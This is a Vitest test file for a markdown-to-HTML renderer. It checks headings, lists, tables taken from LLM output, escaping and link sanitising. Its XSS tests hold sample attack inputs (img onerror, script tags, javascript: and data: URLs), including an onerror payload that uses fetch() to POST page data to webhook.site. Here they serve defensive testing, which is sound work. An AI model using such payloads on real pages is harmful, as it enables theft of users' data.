import { readFileSync } from "node:fs";
import { join } from "node:path";
import process from "node:process";
import { generateText } from "ai";
import { describe, expect, it } from "vitest";
import {
  astToHTML,
  cleanMarkdownSyntax,
  escapeHtml,
  extractLinkData,
  markdownToHTML,
  parseMarkdownToAST,
  sanitizeHref,
} from "./markdown.ts";

// Load API keys from ~/.atlas/.env (no dotenv dep — parse manually)
function loadAtlasEnv(): void {
  const atlasHome = process.env.ATLAS_HOME ?? join(process.env.HOME ?? "", ".atlas");
  try {
    const content = readFileSync(join(atlasHome, ".env"), "utf-8");
    for (const line of content.split("\n")) {
      const match = line.match(/^([A-Z_]+)=(.+)$/);
      const key = match?.[1];
      const value = match?.[2];
      if (key && value && !process.env[key]) {
        process.env[key] = value;
      }
    }
  } catch {
    // No .env file — tests that need API key will skip
  }
}
loadAtlasEnv();

const hasApiKey =
  !!process.env.ANTHROPIC_API_KEY && process.env.ANTHROPIC_API_KEY !== "dummy-key-for-ci";

describe("parseMarkdownToAST", () => {
  it("simple paragraph", () => {
    const ast = parseMarkdownToAST("Hello world");
    expect(ast).toBeDefined();
    expect(ast?.type).toEqual("Document");
    expect(ast?.children[0]?.type).toEqual("Paragraph");
    expect(ast?.children[0]?.content).toEqual("Hello world");
  });

  it("bold text", () => {
    const ast = parseMarkdownToAST("**bold text**");
    expect(ast?.children[0]?.children[0]?.type).toEqual("StrongEmphasis");
  });

  it("lists", () => {
    const ast = parseMarkdownToAST("- Item 1\n- Item 2");
    expect(ast?.children[0]?.type).toEqual("BulletList");
    expect(ast?.children[0]?.children.length).toEqual(2);
    expect(ast?.children[0]?.children[0]?.type).toEqual("ListItem");
  });

  it("empty input", () => {
    const ast = parseMarkdownToAST("");
    expect(ast).toEqual(null);
  });
});

describe("cleanMarkdownSyntax", () => {
  it("bold markers", () => {
    const node = { type: "StrongEmphasis", content: "**bold**", from: 0, to: 8, children: [] };
    expect(cleanMarkdownSyntax(node)).toEqual("bold");
  });

  it("italic markers", () => {
    const node = { type: "Emphasis", content: "*italic*", from: 0, to: 8, children: [] };
    expect(cleanMarkdownSyntax(node)).toEqual("italic");
  });

  it("header markers", () => {
    const node = { type: "ATXHeading2", content: "## Header", from: 0, to: 9, children: [] };
    expect(cleanMarkdownSyntax(node)).toEqual("Header");
  });
});

describe("extractLinkData", () => {
  it("valid link", () => {
    const result = extractLinkData("[link text](https://example.com)");
    expect(result.text).toEqual("link text");
    expect(result.href).toEqual("https://example.com");
  });

  it("malformed link", () => {
    const result = extractLinkData("not a link");
    expect(result.text).toEqual("not a link");
    expect(result.href).toEqual("#");
  });
});

describe("astToHTML", () => {
  it("paragraph", () => {
    const node = { type: "Paragraph", content: "Hello world", from: 0, to: 11, children: [] };
    expect(astToHTML(node)).toEqual("<p>Hello world</p>");
  });

  it("paragraph inside list item", () => {
    const node = { type: "Paragraph", content: "List item text", from: 0, to: 14, children: [] };
    expect(astToHTML(node, "ListItem")).toEqual("List item text");
  });

  it("bold text", () => {
    const node = { type: "StrongEmphasis", content: "**bold**", from: 0, to: 8, children: [] };
    expect(astToHTML(node)).toEqual("<strong>bold</strong>");
  });

  it("h1 header", () => {
    const node = { type: "ATXHeading1", content: "# Header", from: 0, to: 8, children: [] };
    expect(astToHTML(node)).toEqual("<h1>Header</h1>");
  });

  it("h2 header", () => {
    const node = { type: "ATXHeading2", content: "## Header", from: 0, to: 9, children: [] };
    expect(astToHTML(node)).toEqual("<h2>Header</h2>");
  });

  it("h3 header", () => {
    const node = { type: "ATXHeading3", content: "### Header", from: 0, to: 10, children: [] };
    expect(astToHTML(node)).toEqual("<h3>Header</h3>");
  });

  it("h4 header", () => {
    const node = { type: "ATXHeading4", content: "#### Header", from: 0, to: 11, children: [] };
    expect(astToHTML(node)).toEqual("<h4>Header</h4>");
  });

  it("h5 header to bold paragraph", () => {
    const node = { type: "ATXHeading5", content: "##### Header", from: 0, to: 12, children: [] };
    expect(astToHTML(node)).toEqual("<p><strong>Header</strong></p>");
  });

  it("h6 header to bold paragraph", () => {
    const node = { type: "ATXHeading6", content: "###### Header", from: 0, to: 13, children: [] };
    expect(astToHTML(node)).toEqual("<p><strong>Header</strong></p>");
  });

  it("skip horizontal rules", () => {
    const node = { type: "HorizontalRule", content: "---", from: 0, to: 3, children: [] };
    expect(astToHTML(node)).toEqual("");
  });
});

describe("markdownToHTML", () => {
  it("simple paragraph", () => {
    expect(markdownToHTML("Hello world")).toEqual("<p>Hello world</p>");
  });

  it("bold text", () => {
    expect(markdownToHTML("**bold text**")).toEqual("<p><strong>bold text</strong></p>");
  });

  it("italic text", () => {
    expect(markdownToHTML("*italic text*")).toEqual("<p><em>italic text</em></p>");
  });

  it("unordered list", () => {
    const markdown = "- Item 1\n- Item 2";
    const expected = "<ul><li>Item 1</li><li>Item 2</li></ul>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("ordered list", () => {
    const markdown = "1. First\n2. Second";
    const expected = "<ol><li>First</li><li>Second</li></ol>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("list with inline formatting", () => {
    const markdown = "- **Bold** item\n- *Italic* item";
    const expected = "<ul><li><strong>Bold</strong> item</li><li><em>Italic</em> item</li></ul>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("H1", () => {
    expect(markdownToHTML("# Header 1")).toEqual("<h1>Header 1</h1>");
  });

  it("H2", () => {
    expect(markdownToHTML("## Header 2")).toEqual("<h2>Header 2</h2>");
  });

  it("H3", () => {
    expect(markdownToHTML("### Header 3")).toEqual("<h3>Header 3</h3>");
  });

  it("H4", () => {
    expect(markdownToHTML("#### Header 4")).toEqual("<h4>Header 4</h4>");
  });

  it("H5 to bold paragraph", () => {
    expect(markdownToHTML("##### Header 5")).toEqual("<p><strong>Header 5</strong></p>");
  });

  it("H6 to bold paragraph", () => {
    expect(markdownToHTML("###### Header 6")).toEqual("<p><strong>Header 6</strong></p>");
  });

  it("horizontal rules removed", () => {
    const markdown = "Text\n\n---\n\nMore text";
    const expected = "<p>Text</p><p>More text</p>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("multiple paragraphs", () => {
    const markdown = "Line 1\n\nLine 2";
    const expected = "<p>Line 1</p><p>Line 2</p>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("empty input", () => {
    expect(markdownToHTML("")).toEqual("");
  });

  it("links", () => {
    expect(markdownToHTML("[link text](https://example.com)")).toEqual(
      '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">link text</a></p>',
    );
  });

  it("inline code", () => {
    expect(markdownToHTML("`code`")).toEqual("<p><code>code</code></p>");
  });

  it("code blocks", () => {
    expect(markdownToHTML("```\ncode block\n```")).toEqual("<pre><code>code block</code></pre>");
  });

  it("mixed content", () => {
    const markdown = `Here is a paragraph with **bold** and *italic* text.

1. First item
2. Second item with [a link](https://example.com)`;

    const expected =
      "<p>Here is a paragraph with <strong>bold</strong> and <em>italic</em> text.</p>" +
      '<ol><li>First item</li><li>Second item with <a href="https://example.com" target="_blank" rel="noopener noreferrer">a link</a></li></ol>';

    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("nested bullet list", () => {
    const markdown = `- Item 1
    - Nested item`;
    const expected = "<ul><li>Item 1<ul><li>Nested item</li></ul></li></ul>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("ordered list with nested bullets", () => {
    const markdown = `1. First item
    - Sub bullet
2. Second item`;
    const expected = "<ol><li>First item<ul><li>Sub bullet</li></ul></li><li>Second item</li></ol>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("deeply nested lists", () => {
    const markdown = `1. Top level
    - Second level
        - Third level`;
    const expected =
      "<ol><li>Top level<ul><li>Second level<ul><li>Third level</li></ul></li></ul></li></ol>";
    expect(markdownToHTML(markdown)).toEqual(expected);
  });

  it("LLM-generated table with plain text cells", () => {
    // Real LLM output: bundling savings table from insurance research
    const markdown = `| Bundle Type | Typical Savings |
|---|---|
| Auto + Renters | 5–15% on both policies |
| Auto + Auto (multi-vehicle) | 10–25% on auto |
| Auto + RV/Trailer | 5–15% on both |
| Auto + Renters + RV (triple bundle) | 15–25% total portfolio savings |`;
    const result = markdownToHTML(markdown);
    expect(result).toContain("<table>");
    expect(result).toContain("<th>");
    expect(result).toContain("Bundle Type");
    expect(result).toContain("Typical Savings");
    expect(result).toContain("<td>");
    expect(result).toContain("Auto + Renters");
    expect(result).toContain("5–15% on both policies");
    expect(result).toContain("15–25% total portfolio savings");
    expect(result).toContain("</table>");
    // Must NOT render as raw pipe text in a paragraph
    expect(result).not.toContain("<p>|");
    expect(result).not.toContain("|---|");
  });

  it("LLM-generated table with bold and emoji cells", () => {
    // Real LLM output: carrier comparison table from insurance research
    const markdown = `| Carrier | Auto | Renters | Travel Trailer | Bundle Discount |
|---|---|---|---|---|
| **Allstate** | ✅ | ✅ | ✅ | Up to 25% |
| **Progressive** | ✅ | ✅ | ✅ | Up to 15% |
| **Farmers** | ✅ | ✅ | ✅ (via Foremost) | Up to 20% |
| **State Farm** | ✅ | ✅ | ❌ (limited) | Up to 20% |
| **GEICO** | ✅ | ✅ | ❌ | Up to 25% (auto only) |`;
    const result = markdownToHTML(markdown);
    expect(result).toContain("<table>");
    expect(result).toContain("<th>");
    expect(result).toContain("Carrier");
    expect(result).toContain("Bundle Discount");
    expect(result).toContain("<strong>Allstate</strong>");
    expect(result).toContain("<strong>Progressive</strong>");
    expect(result).toContain("<strong>GEICO</strong>");
    expect(result).toContain("✅");
    expect(result).toContain("❌");
    expect(result).toContain("Up to 25%");
    expect(result).toContain("✅ (via Foremost)");
    expect(result).toContain("</table>");
  });

  it("LLM-generated table with surrounding prose", () => {
    // Real LLM output pattern: heading + prose + table + recommendation
    const markdown = `## Bundling Savings Potential

This is your **single biggest savings lever**. Here's how bundling could work:

| Bundle Type | Typical Savings |
|---|---|
| Auto + Renters | 5–15% on both policies |
| Auto + Auto (multi-vehicle) | 10–25% on auto |

Allstate and Progressive are the strongest candidates.`;
    const result = markdownToHTML(markdown);
    expect(result).toContain("<h2>");
    expect(result).toContain("<table>");
    expect(result).toContain("Bundle Type");
    expect(result).toContain("Auto + Renters");
    expect(result).toContain("</table>");
    expect(result).toContain("<p>Allstate and Progressive are the strongest candidates.</p>");
    expect(result).not.toContain("<p>|");
  });

  it("LLM-generated summary table with multiple text columns", () => {
    // Real LLM output: summary recommendation table
    const markdown = `| Policy | Top Pick | Runner-Up | Key Reason |
|---|---|---|---|
| 2018 Audi Q5 | State Farm or GEICO | Farmers | Competitive luxury rates, multi-vehicle discount |
| 2024 Porsche Cayenne | Chubb | Progressive | Agreed Value, luxury vehicle expertise |
| Renters | Lemonade | State Farm | Cheapest standalone, good bundled |`;
    const result = markdownToHTML(markdown);
    expect(result).toContain("<table>");
    expect(result).toContain("<th>");
    expect(result).toContain("Top Pick");
    expect(result).toContain("Runner-Up");
    expect(result).toContain("Key Reason");
    expect(result).toContain("<td>");
    expect(result).toContain("2018 Audi Q5");
    expect(result).toContain("Chubb");
    expect(result).toContain("Agreed Value, luxury vehicle expertise");
    expect(result).toContain("</table>");
  });
});

describe("escapeHtml", () => {
  it("escapes all dangerous characters", () => {
    expect(escapeHtml('<script>alert("xss")</script>')).toEqual(
      "&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;",
    );
  });

  it("escapes ampersands", () => {
    expect(escapeHtml("a & b")).toEqual("a &amp; b");
  });

  it("escapes single quotes", () => {
    expect(escapeHtml("it's")).toEqual("it&#39;s");
  });

  it("leaves safe text unchanged", () => {
    expect(escapeHtml("Hello world")).toEqual("Hello world");
  });
});

describe("sanitizeHref", () => {
  it("allows https URLs", () => {
    expect(sanitizeHref("https://example.com")).toEqual("https://example.com");
  });

  it("allows http URLs", () => {
    expect(sanitizeHref("http://example.com")).toEqual("http://example.com");
  });

  it("allows mailto URLs", () => {
    expect(sanitizeHref("mailto:user@example.com")).toEqual("mailto:user@example.com");
  });

  it("allows relative URLs", () => {
    expect(sanitizeHref("/path/to/page")).toEqual("/path/to/page");
  });

  it("allows fragment URLs", () => {
    expect(sanitizeHref("#section")).toEqual("#section");
  });

  it("blocks javascript: URLs", () => {
    expect(sanitizeHref("javascript:alert(1)")).toEqual("#");
  });

  it("blocks javascript: URLs case-insensitively", () => {
    expect(sanitizeHref("JavaScript:alert(1)")).toEqual("#");
  });

  it("blocks data: URLs", () => {
    expect(sanitizeHref("data:text/html,<script>alert(1)</script>")).toEqual("#");
  });

  it("blocks vbscript: URLs", () => {
    expect(sanitizeHref("vbscript:alert(1)")).toEqual("#");
  });

  it("trims whitespace", () => {
    expect(sanitizeHref("  https://example.com  ")).toEqual("https://example.com");
  });
});

describe("XSS prevention", () => {
  it("escapes img tag with onerror handler", () => {
    const result = markdownToHTML('hi <img src=x onerror="alert(1)">');
    expect(result).not.toContain("<img");
    expect(result).toContain("&lt;img");
  });

  it("escapes svg tag with onload handler", () => {
    const result = markdownToHTML("<svg onload=alert(1)>");
    expect(result).not.toContain("<svg");
    expect(result).toContain("&lt;svg");
  });

  it("escapes script tags", () => {
    const result = markdownToHTML("<script>alert(1)</script>");
    expect(result).not.toContain("<script>");
    expect(result).toContain("&lt;script&gt;");
  });

  it("escapes iframe tags", () => {
    const result = markdownToHTML('<iframe src="javascript:alert(1)">');
    expect(result).not.toContain("<iframe");
    expect(result).toContain("&lt;iframe");
  });

  it("blocks javascript: in markdown links", () => {
    const result = markdownToHTML("[click](javascript:alert(1))");
    expect(result).not.toContain("javascript:");
    expect(result).toContain('href="#"');
  });

  it("blocks data: URLs in markdown links", () => {
    const result = markdownToHTML("[click](data:text/html,<script>alert(1)</script>)");
    expect(result).not.toContain("data:");
    expect(result).toContain('href="#"');
  });

  it("escapes HTML in paragraph content", () => {
    const result = markdownToHTML('Hello <b onmouseover="alert(1)">world</b>');
    expect(result).not.toContain("<b ");
    expect(result).toContain("&lt;b");
  });

  it("escapes HTML mixed with bold formatting", () => {
    const result = markdownToHTML('**bold** <img src=x onerror="alert(1)">');
    expect(result).toContain("<strong>bold</strong>");
    expect(result).not.toContain("<img");
    expect(result).toContain("&lt;img");
  });

  it("escapes HTML in list items", () => {
    const result = markdownToHTML("- <script>alert(1)</script>\n- safe item");
    expect(result).not.toContain("<script>");
    expect(result).toContain("&lt;script&gt;");
    expect(result).toContain("safe item");
  });

  it("escapes HTML in code blocks", () => {
    const result = markdownToHTML("```\n<script>alert(1)</script>\n```");
    expect(result).toContain("&lt;script&gt;");
    expect(result).not.toContain("<script>alert");
  });

  it("preserves safe https links", () => {
    const result = markdownToHTML("[safe link](https://example.com)");
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain("safe link");
  });

  it("escapes the webhook.site exfiltration payload from the ticket", () => {
    const payload =
      "hi <img src=x onerror=\"fetch('https://webhook.site/id',{method:'POST',body:JSON.stringify({origin:location.origin})})\">";
    const result = markdownToHTML(payload);
    // The <img> tag must be escaped — no live HTML element
    expect(result).not.toContain("<img");
    expect(result).toContain("&lt;img");
    // The onerror handler is rendered as escaped text, not as an executable attribute
    expect(result).toContain("onerror=&quot;");
  });
});

describe.skipIf(!hasApiKey)("markdownToHTML — LLM integration", () => {
  it("renders a table generated by Claude", { timeout: 30_000 }, async () => {
    const { createAnthropicWithOptions } = await import("@atlas/llm");
    const anthropic = createAnthropicWithOptions();
    const model = anthropic("claude-haiku-4-5-20251001");

    const { text } = await generateText({
      model,
      prompt:
        "Create a markdown comparison table of 3 programming languages (Python, TypeScript, Rust) " +
        "with columns: Language, Typing, Speed, Use Case. Use **bold** for language names in the cells. " +
        "Output ONLY the markdown table, no other text.",
    });

    const result = markdownToHTML(text);

    // Must produce actual HTML table elements
    expect(result).toContain("<table>");
    expect(result).toContain("<thead>");
    expect(result).toContain("<th>");
    expect(result).toContain("<tbody>");
    expect(result).toContain("<td>");
    expect(result).toContain("</table>");

    // Must NOT contain raw pipe-table syntax
    expect(result).not.toContain("|---|");
    expect(result).not.toMatch(/<p>\|/);

    // Should contain the requested content
    expect(result).toContain("Python");
    expect(result).toContain("TypeScript");
    expect(result).toContain("Rust");

    // Bold formatting should be rendered
    expect(result).toContain("<strong>");
  });
});
